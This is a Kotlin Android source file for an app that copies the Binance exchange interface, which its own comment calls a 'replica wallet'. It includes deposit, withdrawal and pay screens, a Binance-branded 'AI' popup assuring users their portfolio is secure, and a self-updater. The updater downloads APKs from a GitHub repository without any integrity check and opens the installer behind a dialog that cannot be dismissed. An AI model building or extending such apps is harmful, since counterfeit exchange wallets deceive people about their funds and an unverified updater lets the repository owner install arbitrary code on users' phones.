package com.example

import android.os.Bundle
import android.widget.Toast
import androidx.activity.ComponentActivity
import androidx.activity.compose.setContent
import androidx.activity.enableEdgeToEdge
import androidx.compose.foundation.Canvas
import androidx.compose.foundation.background
import androidx.compose.foundation.border
import androidx.compose.foundation.clickable
import androidx.compose.foundation.layout.*
import androidx.compose.foundation.shape.CircleShape
import androidx.compose.foundation.shape.RoundedCornerShape
import androidx.compose.ui.geometry.Offset
import androidx.compose.ui.geometry.Size
import androidx.compose.ui.graphics.drawscope.Stroke
import androidx.compose.ui.graphics.drawscope.rotate
import androidx.compose.ui.graphics.Brush
import androidx.compose.ui.graphics.graphicsLayer
import androidx.compose.material.icons.Icons
import androidx.compose.material.icons.filled.*
import androidx.compose.material3.*
import androidx.compose.runtime.*
import androidx.compose.ui.Alignment
import androidx.compose.ui.Modifier
import androidx.compose.ui.draw.clip
import androidx.compose.ui.graphics.Color
import androidx.compose.ui.graphics.Path
import androidx.compose.ui.graphics.StrokeCap
import androidx.compose.ui.graphics.StrokeJoin
import androidx.compose.ui.platform.LocalContext
import androidx.compose.ui.res.painterResource
import androidx.compose.ui.text.font.FontWeight
import androidx.compose.ui.unit.dp
import androidx.compose.ui.unit.sp
import androidx.lifecycle.viewmodel.compose.viewModel
import com.example.ui.CryptoViewModel
import com.example.ui.screens.AssetsScreen
import com.example.ui.screens.DepositScreen
import com.example.ui.screens.HomeScreen
import com.example.ui.screens.PayScreen
import com.example.ui.screens.ScanScreen
import com.example.ui.screens.WithdrawalScreen
import com.example.ui.theme.*

import java.net.HttpURLConnection
import java.net.URL
import java.io.BufferedReader
import java.io.InputStreamReader
import java.io.File
import java.io.FileOutputStream
import java.io.InputStream
import android.content.Context
import androidx.core.content.FileProvider
import kotlinx.coroutines.Dispatchers
import kotlinx.coroutines.withContext
import kotlinx.coroutines.launch
import android.content.Intent
import android.net.Uri

import androidx.compose.ui.res.painterResource

class MainActivity : ComponentActivity() {
    override fun onCreate(savedInstanceState: Bundle?) {
        super.onCreate(savedInstanceState)
        enableEdgeToEdge()
        setContent {
            MyApplicationTheme {
                MainAppContainer()
            }
        }
    }
}

@Composable
fun MainAppContainer() {
    val viewModel: CryptoViewModel = viewModel()
    val context = LocalContext.current

    // Active screen navigation tab: "Home", "Deposit", "Scan", "Pay", "Assets"
    var activeTab by remember { mutableStateOf("Assets") } // Start on Assets tab to show the replica wallet directly!

    // Overlay dialog state for Smiley Face helper
    var showSmileyTip by remember { mutableStateOf(false) }

    // Update Checker States
    val coroutineScope = rememberCoroutineScope()
    var updateInfo by remember { mutableStateOf<UpdateInfo?>(null) }
    var showUpdateDialog by remember { mutableStateOf(false) }
    var isCheckingUpdates by remember { mutableStateOf(false) }
    var downloadProgress by remember { mutableStateOf<Float?>(null) }
    var downloadStatusText by remember { mutableStateOf("") }

    val currentVersionName = remember {
        try {
            context.packageManager.getPackageInfo(context.packageName, 0).versionName ?: "1.0"
        } catch (e: Exception) {
            "1.0"
        }
    }

    // Function to download and trigger installation
    val handleDownloadAndInstall = { url: String ->
        downloadProgress = 0f
        downloadStatusText = "Connecting..."
        coroutineScope.launch {
            try {
                val apkFile = File(context.externalCacheDir ?: context.cacheDir, "update.apk")
                if (apkFile.exists()) {
                    apkFile.delete()
                }
                
                val success = downloadApk(url, apkFile) { progress ->
                    downloadProgress = progress
                    downloadStatusText = "Downloading update: ${(progress * 100).toInt()}%"
                }
                
                if (success && apkFile.exists()) {
                    downloadStatusText = "Opening installer..."
                    downloadProgress = null
                    installApk(context, apkFile)
                } else {
                    downloadProgress = null
                    Toast.makeText(context, "Download failed. Opening in browser...", Toast.LENGTH_LONG).show()
                    try {
                        val intent = Intent(Intent.ACTION_VIEW, Uri.parse(url))
                        context.startActivity(intent)
                    } catch (e: Exception) {
                        Toast.makeText(context, "Could not open link", Toast.LENGTH_SHORT).show()
                    }
                }
            } catch (e: Exception) {
                downloadProgress = null
                Toast.makeText(context, "Error: ${e.localizedMessage}", Toast.LENGTH_LONG).show()
            }
        }
    }

    // Function to run the check
    val runUpdateCheck = {
        if (!isCheckingUpdates) {
            isCheckingUpdates = true
            coroutineScope.launch {
                val info = checkForUpdates(currentVersionName)
                isCheckingUpdates = false
                updateInfo = info
                if (info.hasUpdate) {
                    showUpdateDialog = true
                } else {
                    Toast.makeText(context, "Your app is up to date! (v$currentVersionName)", Toast.LENGTH_SHORT).show()
                }
            }
        }
    }

    // Auto-check for updates on launch
    LaunchedEffect(Unit) {
        isCheckingUpdates = true
        val info = checkForUpdates(currentVersionName)
        isCheckingUpdates = false
        if (info.hasUpdate) {
            updateInfo = info
            showUpdateDialog = true
        }
    }

    // Secondary sub-screen routes (like direct full-screen withdrawal or deposit)
    var isWithdrawalFullFlow by remember { mutableStateOf(false) }
    var isDepositFullFlow by remember { mutableStateOf(false) }

    Scaffold(
        modifier = Modifier
            .fillMaxSize()
            .background(BinanceDarkBg),
        bottomBar = {
            if (!isWithdrawalFullFlow && !isDepositFullFlow && activeTab != "Scan") {
                Column {
                    HorizontalDivider(color = BinanceDivider, thickness = 0.5.dp)
                    Row(
                        modifier = Modifier
                            .fillMaxWidth()
                            .background(BinanceDarkSurface)
                            .navigationBarsPadding()
                            .padding(vertical = 4.dp),
                        horizontalArrangement = Arrangement.SpaceAround,
                        verticalAlignment = Alignment.CenterVertically
                    ) {
                        // Tab definitions with custom visual layouts matching Binance
                        val navigationItems = listOf(
                            Triple("Home", R.drawable.ic_bottom_home, "Home"),
                            Triple("Deposit", R.drawable.ic_bottom_deposit, "Deposit"),
                            Triple("Scan", R.drawable.ic_bottom_scan, "Scan"),
                            Triple("Pay", R.drawable.ic_bottom_pay, "Pay"),
                            Triple("Assets", R.drawable.ic_bottom_assets, "Assets")
                        )

                        navigationItems.forEach { (name, iconRes, contentDescription) ->
                            val isSelected = activeTab == name
                            val itemColor = if (isSelected) Color.White else BinanceTextSecondary

                            Column(
                                modifier = Modifier
                                    .clickable {
                                        activeTab = name
                                        if (name == "Home") {
                                            viewModel.showTradingView.value = false
                                        }
                                    }
                                    .padding(horizontal = 8.dp, vertical = 2.dp),
                                horizontalAlignment = Alignment.CenterHorizontally,
                                verticalArrangement = Arrangement.spacedBy(2.dp)
                            ) {
                                BottomBarCustomIcon(
                                    name = name,
                                    itemColor = itemColor,
                                    isSelected = isSelected
                                )
                                Text(
                                    text = name,
                                    color = itemColor,
                                    fontSize = 10.sp,
                                    fontWeight = if (isSelected) FontWeight.Bold else FontWeight.Medium
                                )
                            }
                        }
                    }
                }
            }
        }
    ) { innerPadding ->
        Box(
            modifier = Modifier
                .fillMaxSize()
                .padding(innerPadding)
        ) {
            when {
                isWithdrawalFullFlow -> {
                    WithdrawalScreen(
                        viewModel = viewModel,
                        onBack = { isWithdrawalFullFlow = false }
                    )
                }
                isDepositFullFlow -> {
                    DepositScreen(
                        viewModel = viewModel,
                        onBack = { isDepositFullFlow = false }
                    )
                }
                else -> {
                    when (activeTab) {
                        "Home" -> {
                            HomeScreen(viewModel = viewModel)
                        }
                        "Deposit" -> {
                            DepositScreen(
                                viewModel = viewModel,
                                onBack = { activeTab = "Assets" }
                            )
                        }
                        "Scan" -> {
                            ScanScreen(
                                onAddressScanned = { _ -> },
                                onBack = { activeTab = "Assets" }
                            )
                        }
                        "Pay" -> {
                            PayScreen(
                                viewModel = viewModel,
                                onBack = { activeTab = "Assets" }
                            )
                        }
                        "Assets" -> {
                            AssetsScreen(
                                viewModel = viewModel,
                                onNavigateToDeposit = { isDepositFullFlow = true },
                                onNavigateToWithdrawal = { isWithdrawalFullFlow = true },
                                onNavigateToTrade = { pair ->
                                    viewModel.selectPair(pair)
                                    viewModel.showTradingView.value = true
                                    activeTab = "Home"
                                },
                                currentVersionName = currentVersionName,
                                isCheckingUpdates = isCheckingUpdates,
                                onCheckForUpdates = runUpdateCheck
                            )
                        }
                    }
                }
            }

            // Smiley face overlay message modal
            if (showSmileyTip) {
                AlertDialog(
                    onDismissRequest = { showSmileyTip = false },
                    containerColor = BinanceDarkSurface,
                    title = {
                        Row(
                            verticalAlignment = Alignment.CenterVertically,
                            horizontalArrangement = Arrangement.spacedBy(8.dp)
                        ) {
                            Text("☺", fontSize = 28.sp, color = BinanceGold)
                            Text("Smart Portfolio Advisor", color = BinanceTextPrimary, fontWeight = FontWeight.Bold, fontSize = 16.sp)
                        }
                    },
                    text = {
                        Column(verticalArrangement = Arrangement.spacedBy(10.dp)) {
                            Text(
                                text = "Welcome to your premium Binance AI Space! We detected your ACT I (Act I : The AI Prophecy) position. You are positioned at the cutting edge of AI agent utilities.",
                                color = BinanceTextPrimary,
                                fontSize = 13.sp
                            )
                            Text(
                                text = "💡 Tip of the Day: Your overall portfolio is highly secure. Track live blockchain transitions in your Send/Withdrawal portal to observe real-time transaction speeds.",
                                color = BinanceTextSecondary,
                                fontSize = 12.sp
                            )
                        }
                    },
                    confirmButton = {
                        Button(
                            onClick = { showSmileyTip = false },
                            colors = ButtonDefaults.buttonColors(containerColor = BinanceGold, contentColor = Color.Black),
                            shape = RoundedCornerShape(6.dp)
                        ) {
                            Text("Excellent, Thanks!", fontWeight = FontWeight.Bold)
                        }
                    }
                )
            }

            // Update Check Dialog Overlay
            if (showUpdateDialog && updateInfo != null) {
                val info = updateInfo!!
                AlertDialog(
                    onDismissRequest = { showUpdateDialog = false },
                    containerColor = BinanceDarkSurface,
                    shape = RoundedCornerShape(16.dp),
                    title = {
                        Row(
                            verticalAlignment = Alignment.CenterVertically,
                            horizontalArrangement = Arrangement.spacedBy(10.dp)
                        ) {
                            Icon(
                                imageVector = Icons.Filled.SystemUpdate,
                                contentDescription = "Update Available",
                                tint = BinanceGold,
                                modifier = Modifier.size(28.dp)
                            )
                            Text(
                                text = "New Version Available!",
                                color = BinanceTextPrimary,
                                fontWeight = FontWeight.Bold,
                                fontSize = 18.sp
                            )
                        }
                    },
                    text = {
                        Column(verticalArrangement = Arrangement.spacedBy(12.dp)) {
                            Text(
                                text = "A new version of the app (${info.latestVersion}) has been detected. Updates from your GitHub repository can be downloaded and installed directly.",
                                color = BinanceTextPrimary,
                                fontSize = 13.sp
                            )
                            
                            // Changelog/Release Notes box
                            Box(
                                modifier = Modifier
                                    .fillMaxWidth()
                                    .heightIn(max = 120.dp)
                                    .background(BinanceDarkBg, shape = RoundedCornerShape(8.dp))
                                    .border(0.5.dp, BinanceDivider, shape = RoundedCornerShape(8.dp))
                                    .padding(10.dp)
                            ) {
                                Column {
                                    Text(
                                        text = "Release Notes:",
                                        color = BinanceTextSecondary,
                                        fontWeight = FontWeight.Bold,
                                        fontSize = 11.sp
                                    )
                                    Spacer(modifier = Modifier.height(4.dp))
                                    Text(
                                        text = info.changeLog,
                                        color = BinanceTextPrimary,
                                        fontSize = 12.sp
                                    )
                                }
                            }
                            
                            Text(
                                text = "Current version: v$currentVersionName",
                                color = BinanceTextSecondary,
                                fontSize = 11.sp
                            )
                        }
                    },
                    dismissButton = {
                        TextButton(
                            onClick = { showUpdateDialog = false }
                        ) {
                            Text("Later", color = BinanceTextSecondary, fontWeight = FontWeight.Bold)
                        }
                    },
                    confirmButton = {
                        Button(
                            onClick = {
                                showUpdateDialog = false
                                handleDownloadAndInstall(info.downloadUrl)
                            },
                            colors = ButtonDefaults.buttonColors(
                                containerColor = BinanceGold,
                                contentColor = Color.Black
                            ),
                            shape = RoundedCornerShape(6.dp)
                        ) {
                            Text("Update Now", fontWeight = FontWeight.Bold)
                        }
                    }
                )
            }

            // Download Progress Dialog Overlay
            if (downloadProgress != null) {
                val progressVal = downloadProgress!!
                AlertDialog(
                    onDismissRequest = { /* Cannot dismiss during critical update download */ },
                    containerColor = BinanceDarkSurface,
                    shape = RoundedCornerShape(16.dp),
                    title = {
                        Row(
                            verticalAlignment = Alignment.CenterVertically,
                            horizontalArrangement = Arrangement.spacedBy(10.dp)
                        ) {
                            CircularProgressIndicator(
                                modifier = Modifier.size(24.dp),
                                color = BinanceGold,
                                strokeWidth = 2.5.dp
                            )
                            Text(
                                text = "Downloading Update",
                                color = BinanceTextPrimary,
                                fontWeight = FontWeight.Bold,
                                fontSize = 16.sp
                            )
                        }
                    },
                    text = {
                        Column(verticalArrangement = Arrangement.spacedBy(12.dp)) {
                            Text(
                                text = downloadStatusText,
                                color = BinanceTextPrimary,
                                fontSize = 13.sp
                            )
                            
                            LinearProgressIndicator(
                                progress = { progressVal },
                                modifier = Modifier
                                    .fillMaxWidth()
                                    .height(8.dp)
                                    .clip(RoundedCornerShape(4.dp)),
                                color = BinanceGold,
                                trackColor = BinanceDivider
                            )
                            
                            Text(
                                text = "Please wait while the update file is downloaded and installed automatically.",
                                color = BinanceTextSecondary,
                                fontSize = 11.sp
                            )
                        }
                    },
                    confirmButton = {} // Non-interactive loader
                )
            }

            // Beautiful, high-fidelity fully floating rounded-diamond gradient smiley button matching the user's screenshot
            if (!isWithdrawalFullFlow && !isDepositFullFlow && (activeTab == "Home" || activeTab == "Assets")) {
                Box(
                    modifier = Modifier
                        .align(Alignment.BottomEnd)
                        .padding(bottom = 16.dp)
                        .offset(x = 10.dp) // shift right to cut off naturally without losing face size
                        .size(40.dp)
                        .clickable { showSmileyTip = true },
                    contentAlignment = Alignment.Center
                ) {
                    // Rotated Diamond Background with gold-to-orange gradient and dark outline matching the user's screenshot
                    Box(
                        modifier = Modifier
                            .size(28.dp)
                            .graphicsLayer { rotationZ = 45f }
                            .background(
                                brush = Brush.verticalGradient(
                                    colors = listOf(
                                        Color(0xFFFFF047), // Bright golden-yellow
                                        Color(0xFFEF8F10)  // Warm rich orange
                                    )
                                ),
                                shape = RoundedCornerShape(7.dp)
                            )
                            .border(
                                width = 1.2.dp,
                                color = Color(0xFF1E2026), // Sharp dark outline
                                shape = RoundedCornerShape(7.dp)
                            )
                    )

                    // Unrotated, perfectly aligned upright face overlay
                    Column(
                        horizontalAlignment = Alignment.CenterHorizontally,
                        verticalArrangement = Arrangement.spacedBy(1.5.dp)
                    ) {
                        // Smiley eyes
                        Row(
                            horizontalArrangement = Arrangement.spacedBy(4.5.dp),
                            verticalAlignment = Alignment.CenterVertically
                        ) {
                            // Left eye
                            Box(
                                modifier = Modifier
                                    .size(width = 2.dp, height = 5.5.dp)
                                    .background(Color(0xFF1E2026), shape = RoundedCornerShape(0.8.dp))
                            )
                            // Right eye
                            Box(
                                modifier = Modifier
                                    .size(width = 2.dp, height = 5.5.dp)
                                    .background(Color(0xFF1E2026), shape = RoundedCornerShape(0.8.dp))
                            )
                        }

                        // Smiling mouth
                        Canvas(
                            modifier = Modifier
                                .size(width = 8.dp, height = 4.dp)
                        ) {
                            drawArc(
                                color = Color(0xFF1E2026),
                                startAngle = 0f,
                                sweepAngle = 180f,
                                useCenter = true
                            )
                        }
                    }
                }
            }
        }
    }
}

@Composable
fun BottomBarCustomIcon(name: String, itemColor: Color, isSelected: Boolean) {
    if (name == "Home") {
        Icon(
            painter = painterResource(id = R.drawable.ic_bottom_home),
            contentDescription = "Home",
            tint = itemColor,
            modifier = Modifier.size(20.dp)
        )
        return
    }

    Canvas(modifier = Modifier.size(20.dp)) {
        val w = size.width
        val h = size.height
        val scaleX = w / 24f
        val scaleY = h / 24f

        when (name) {
            "Assets" -> {
                // Folder Path
                val folderPath = Path().apply {
                    moveTo(4f * scaleX, 9f * scaleY)
                    lineTo(4f * scaleX, 8f * scaleY)
                    quadraticTo(4f * scaleX, 6f * scaleY, 6f * scaleX, 6f * scaleY)
                    lineTo(10f * scaleX, 6f * scaleY)
                    quadraticTo(11f * scaleX, 6f * scaleY, 11f * scaleX, 7f * scaleY)
                    lineTo(11f * scaleX, 9f * scaleY)
                    lineTo(18f * scaleX, 9f * scaleY)
                    quadraticTo(20f * scaleX, 9f * scaleY, 20f * scaleX, 11f * scaleY)
                    lineTo(20f * scaleX, 17f * scaleY)
                    quadraticTo(20f * scaleX, 19f * scaleY, 18f * scaleX, 19f * scaleY)
                    lineTo(6f * scaleX, 19f * scaleY)
                    quadraticTo(4f * scaleX, 19f * scaleY, 4f * scaleX, 17f * scaleY)
                    close()
                }
                drawPath(
                    path = folderPath,
                    color = itemColor,
                    style = Stroke(width = 1.8.dp.toPx(), join = StrokeJoin.Round, cap = StrokeCap.Round)
                )

                // Gold/Yellow Filled Diamond inside
                val diamondPath = Path().apply {
                    moveTo(15.5f * scaleX, 11.5f * scaleY)
                    lineTo(18.5f * scaleX, 14.5f * scaleY)
                    lineTo(15.5f * scaleX, 17.5f * scaleY)
                    lineTo(12.5f * scaleX, 14.5f * scaleY)
                    close()
                }
                // Always gold color matching the photo
                drawPath(
                    path = diamondPath,
                    color = Color(0xFFF3BA2F)
                )
            }
            "Deposit" -> {
                // Open Tray Path with rounded corner endpoints (no recess going down)
                val trayPath = Path().apply {
                    moveTo(9f * scaleX, 10f * scaleY)
                    lineTo(7f * scaleX, 10f * scaleY)
                    quadraticTo(4f * scaleX, 10f * scaleY, 4f * scaleX, 13f * scaleY)
                    lineTo(4f * scaleX, 16f * scaleY)
                    quadraticTo(4f * scaleX, 19f * scaleY, 7f * scaleX, 19f * scaleY)
                    lineTo(17f * scaleX, 19f * scaleY)
                    quadraticTo(20f * scaleX, 19f * scaleY, 20f * scaleX, 16f * scaleY)
                    lineTo(20f * scaleX, 13f * scaleY)
                    quadraticTo(20f * scaleX, 10f * scaleY, 17f * scaleX, 10f * scaleY)
                    lineTo(15f * scaleX, 10f * scaleY)
                }
                drawPath(
                    path = trayPath,
                    color = itemColor,
                    style = Stroke(width = 1.8.dp.toPx(), join = StrokeJoin.Round, cap = StrokeCap.Round)
                )

                // Downward Arrow
                drawLine(
                    color = itemColor,
                    start = Offset(12f * scaleX, 4f * scaleY),
                    end = Offset(12f * scaleX, 11f * scaleY),
                    strokeWidth = 1.8.dp.toPx(),
                    cap = StrokeCap.Round
                )
                val arrowTipPath = Path().apply {
                    moveTo(9.5f * scaleX, 8.5f * scaleY)
                    lineTo(12f * scaleX, 11f * scaleY)
                    lineTo(14.5f * scaleX, 8.5f * scaleY)
                }
                drawPath(
                    path = arrowTipPath,
                    color = itemColor,
                    style = Stroke(width = 1.8.dp.toPx(), join = StrokeJoin.Round, cap = StrokeCap.Round)
                )

                // Diamond outline inside the tray (hollow outline)
                val innerDiamondPath = Path().apply {
                    moveTo(12f * scaleX, 13f * scaleY)
                    lineTo(14.5f * scaleX, 15.5f * scaleY)
                    lineTo(12f * scaleX, 18f * scaleY)
                    lineTo(9.5f * scaleX, 15.5f * scaleY)
                    close()
                }
                drawPath(
                    path = innerDiamondPath,
                    color = itemColor,
                    style = Stroke(width = 1.8.dp.toPx(), join = StrokeJoin.Round, cap = StrokeCap.Round)
                )
            }
            "Pay" -> {
                // Coin Circle
                drawCircle(
                    color = itemColor,
                    radius = 4.2f * scaleX,
                    center = Offset(15.5f * scaleX, 8.5f * scaleY),
                    style = Stroke(width = 1.8.dp.toPx())
                )

                // Hollow Diamond inside the Coin
                val payDiamondPath = Path().apply {
                    moveTo(15.5f * scaleX, 6.2f * scaleY)
                    lineTo(17.8f * scaleX, 8.5f * scaleY)
                    lineTo(15.5f * scaleX, 10.8f * scaleY)
                    lineTo(13.2f * scaleX, 8.5f * scaleY)
                    close()
                }
                drawPath(
                    path = payDiamondPath,
                    color = itemColor,
                    style = Stroke(width = 1.8.dp.toPx(), join = StrokeJoin.Round, cap = StrokeCap.Round)
                )

                // Hand Path 1 (Outer palm and wrist with flat horizontal base)
                val handPath1 = Path().apply {
                    moveTo(9.5f * scaleX, 15f * scaleY)
                    lineTo(11f * scaleX, 18f * scaleY)
                    lineTo(14f * scaleX, 18f * scaleY)
                    quadraticTo(17f * scaleX, 18f * scaleY, 18f * scaleX, 14f * scaleY)
                    lineTo(14.5f * scaleX, 11f * scaleY)
                }
                drawPath(
                    path = handPath1,
                    color = itemColor,
                    style = Stroke(width = 1.8.dp.toPx(), join = StrokeJoin.Round, cap = StrokeCap.Round)
                )

                // Hand Path 2 (Inner palm crease)
                val handPath2 = Path().apply {
                    moveTo(9.5f * scaleX, 15f * scaleY)
                    lineTo(12f * scaleX, 12.5f * scaleY)
                    quadraticTo(13.5f * scaleX, 14.5f * scaleY, 14.5f * scaleX, 14.5f * scaleY)
                }
                drawPath(
                    path = handPath2,
                    color = itemColor,
                    style = Stroke(width = 1.8.dp.toPx(), join = StrokeJoin.Round, cap = StrokeCap.Round)
                )

                // Hand Path 3 (Thumb support under coin)
                val handPath3 = Path().apply {
                    moveTo(12f * scaleX, 12.5f * scaleY)
                    quadraticTo(13.5f * scaleX, 12.5f * scaleY, 14.5f * scaleX, 13.5f * scaleY)
                }
                drawPath(
                    path = handPath3,
                    color = itemColor,
                    style = Stroke(width = 1.8.dp.toPx(), join = StrokeJoin.Round, cap = StrokeCap.Round)
                )
            }
            "Scan" -> {
                // Corners
                val tlBracket = Path().apply {
                    moveTo(9f * scaleX, 5f * scaleY)
                    lineTo(7f * scaleX, 5f * scaleY)
                    quadraticTo(5f * scaleX, 5f * scaleY, 5f * scaleX, 7f * scaleY)
                    lineTo(5f * scaleX, 9f * scaleY)
                }
                val trBracket = Path().apply {
                    moveTo(15f * scaleX, 5f * scaleY)
                    lineTo(17f * scaleX, 5f * scaleY)
                    quadraticTo(19f * scaleX, 5f * scaleY, 19f * scaleX, 7f * scaleY)
                    lineTo(19f * scaleX, 9f * scaleY)
                }
                val blBracket = Path().apply {
                    moveTo(5f * scaleX, 15f * scaleY)
                    lineTo(5f * scaleX, 17f * scaleY)
                    quadraticTo(5f * scaleX, 19f * scaleY, 7f * scaleX, 19f * scaleY)
                    lineTo(9f * scaleX, 19f * scaleY)
                }
                val brBracket = Path().apply {
                    moveTo(19f * scaleX, 15f * scaleY)
                    lineTo(19f * scaleX, 17f * scaleY)
                    quadraticTo(19f * scaleX, 19f * scaleY, 17f * scaleX, 19f * scaleY)
                    lineTo(15f * scaleX, 19f * scaleY)
                }

                listOf(tlBracket, trBracket, blBracket, brBracket).forEach { path ->
                    drawPath(
                        path = path,
                        color = itemColor,
                        style = Stroke(width = 1.8.dp.toPx(), join = StrokeJoin.Round, cap = StrokeCap.Round)
                    )
                }

                // Center rounded minus line (pill) - NO vertical caps!
                drawLine(
                    color = itemColor,
                    start = Offset(9f * scaleX, 12f * scaleY),
                    end = Offset(15f * scaleX, 12f * scaleY),
                    strokeWidth = 2.0.dp.toPx(),
                    cap = StrokeCap.Round
                )
            }
        }
    }
}

// --- APP UPDATER SYSTEM ---

data class UpdateInfo(
    val hasUpdate: Boolean,
    val latestVersion: String,
    val downloadUrl: String,
    val changeLog: String
)

suspend fun checkForUpdates(currentVersion: String): UpdateInfo = withContext(Dispatchers.IO) {
    try {
        val url = URL("https://api.github.com/repos/arbitragemasters/bnb-apu/releases/latest")
        val connection = url.openConnection() as HttpURLConnection
        connection.requestMethod = "GET"
        connection.setRequestProperty("User-Agent", "Mozilla/5.0")
        connection.connectTimeout = 8000
        connection.readTimeout = 8000
        
        if (connection.responseCode == 200) {
            val reader = BufferedReader(InputStreamReader(connection.inputStream))
            val response = StringBuilder()
            var line: String?
            while (reader.readLine().also { line = it } != null) {
                response.append(line)
            }
            reader.close()
            
            val json = response.toString()
            
            // Extracts tag_name, html_url, body from JSON
            val tagName = extractJsonValue(json, "tag_name")
            val htmlUrl = extractJsonValue(json, "html_url")
            val body = extractJsonValue(json, "body")
            
            // Check if there's a direct APK in assets
            val directApkUrl = extractJsonValue(json, "browser_download_url")
            val finalDownloadUrl = if (directApkUrl.isNotEmpty()) directApkUrl else if (htmlUrl.isNotEmpty()) htmlUrl else "https://github.com/arbitragemasters/bnb-apu/releases"
            
            // Normalize versions (remove 'v' prefix, spaces, and trim)
            val cleanCurrent = currentVersion.removePrefix("v").trim()
            val cleanLatest = tagName.removePrefix("v").trim()
            
            // Determine if update is available
            val hasUpdate = cleanLatest.isNotEmpty() && cleanLatest != cleanCurrent
            
            UpdateInfo(
                hasUpdate = hasUpdate,
                latestVersion = tagName.ifEmpty { "v$cleanLatest" },
                downloadUrl = finalDownloadUrl,
                changeLog = body.ifEmpty { "Bug fixes and stability improvements." }
            )
        } else {
            UpdateInfo(false, "", "", "")
        }
    } catch (e: Exception) {
        e.printStackTrace()
        UpdateInfo(false, "", "", "")
    }
}

fun extractJsonValue(json: String, key: String): String {
    val pattern = "\"$key\"\\s*:\\s*\"([^\"]+)\"".toRegex()
    val match = pattern.find(json)
    return match?.groupValues?.get(1) ?: ""
}

suspend fun downloadApk(
    downloadUrl: String,
    destinationFile: File,
    onProgress: (Float) -> Unit
): Boolean = withContext(Dispatchers.IO) {
    var inputStream: InputStream? = null
    var outputStream: FileOutputStream? = null
    try {
        val url = URL(downloadUrl)
        val connection = url.openConnection() as HttpURLConnection
        connection.connectTimeout = 15000
        connection.readTimeout = 15000
        connection.setRequestProperty("User-Agent", "Mozilla/5.0")
        connection.connect()
        
        if (connection.responseCode in 200..299) {
            val fileLength = connection.contentLength
            inputStream = connection.inputStream
            outputStream = FileOutputStream(destinationFile)
            
            val data = ByteArray(4096)
            var total: Long = 0
            var count: Int
            while (inputStream.read(data).also { count = it } != -1) {
                total += count
                if (fileLength > 0) {
                    onProgress(total.toFloat() / fileLength.toFloat())
                }
                outputStream.write(data, 0, count)
            }
            outputStream.flush()
            true
        } else {
            false
        }
    } catch (e: Exception) {
        e.printStackTrace()
        false
    } finally {
        try { inputStream?.close() } catch (e: Exception) {}
        try { outputStream?.close() } catch (e: Exception) {}
    }
}

fun installApk(context: Context, apkFile: File) {
    try {
        val intent = Intent(Intent.ACTION_VIEW).apply {
            flags = Intent.FLAG_ACTIVITY_NEW_TASK or Intent.FLAG_GRANT_READ_URI_PERMISSION
            val uri = FileProvider.getUriForFile(
                context,
                "${context.packageName}.fileprovider",
                apkFile
            )
            setDataAndType(uri, "application/vnd.android.package-archive")
        }
        context.startActivity(intent)
    } catch (e: Exception) {
        e.printStackTrace()
        // If modern direct file sharing fails, fallback to direct intent for older versions
        try {
            val intent = Intent(Intent.ACTION_VIEW).apply {
                flags = Intent.FLAG_ACTIVITY_NEW_TASK
                setDataAndType(Uri.fromFile(apkFile), "application/vnd.android.package-archive")
            }
            context.startActivity(intent)
        } catch (e2: Exception) {
            e2.printStackTrace()
            Toast.makeText(context, "Installation trigger failed. Please launch APK manually from files.", Toast.LENGTH_LONG).show()
        }
    }
}

